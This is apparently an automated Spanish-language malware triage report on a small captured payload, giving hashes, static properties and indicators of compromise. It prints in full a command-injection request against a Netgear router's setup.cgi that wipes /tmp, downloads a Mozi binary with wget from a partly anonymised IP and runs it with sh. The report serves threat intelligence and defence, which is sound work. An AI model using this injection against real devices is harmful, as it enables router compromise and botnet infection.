# 🧬 Payload Analysis

`82c4b084bf2d56eb0644f52f552c93ce4a5d5c7f9a26b5ab46474a240e0f7f97`

## 📌 Resumen

Texto ASCII de 176 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `netgear` en `hxxp://103.176.16.XXX:45688/Mozi.m+-O+/tmp/netgear`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh netgear`
2. `wget hxxp://103.176.16.XXX:45688/Mozi.m -O /tmp/netgea` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/82c4b084bf2d56eb0644f52f552c93ce4a5d5c7f9a26b5ab46474a240e0f7f97.md](../../../../../malware-like/oraculo/downloader/82c4b084bf2d56eb0644f52f552c93ce4a5d5c7f9a26b5ab46474a240e0f7f97.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:17:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `82c4b084bf2d56eb0644f52f552c93ce4a5d5c7f9a26b5ab46474a240e0f7f97`
- **SHA1:** `400e5da70283fc082fd99d36887f11ba3785c0cd`
- **MD5:** `4d46c162b11879f192431437c3b59a28`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 176 B |
| Entropía | 5.18 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://103.176.16.XXX:45688/Mozi.m+-O+/tmp/netgea
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://103.176.16.XXX:45688/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| ip | 103.176.16.XXX | static_analysis |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://103.176.16.XXX:45688/Mozi.m+-O+/tmp/netgea | strings |
| hash | 82c4b084bf2d56eb0644f52f552c93ce4a5d5c7f9a26b5ab46474a240e0f7f97 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
